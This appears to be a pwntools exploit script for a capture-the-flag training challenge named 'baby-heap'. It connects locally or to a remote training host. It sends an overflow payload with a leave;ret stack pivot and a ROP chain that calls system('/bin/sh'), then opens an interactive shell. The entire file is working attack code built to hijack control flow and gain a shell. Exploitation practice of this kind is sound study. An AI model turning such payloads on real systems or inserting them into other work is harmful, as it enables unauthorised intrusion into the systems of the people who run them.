#!/usr/bin/env python3
from pwn import *

PORT = 1337
HOST = "pwn-baby-heap-85dcdf507899.training.bksec.vn"
elf = context.binary = ELF('./heap', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b*0x0000000000401983
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=True, sni=HOST)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

pop_rdi = 0x0040205f
bin_sh = 0x49b008
system = 0x40c040
leave_ret = 0x4019AF

pl = b'A'*0x50 + p64(leave_ret) + b'B'*0x20 
pl += p64(pop_rdi+1) + p64(pop_rdi) +  p64(bin_sh) + p64(system)
# GDB()
sla(b'string: ', pl)

p.interactive()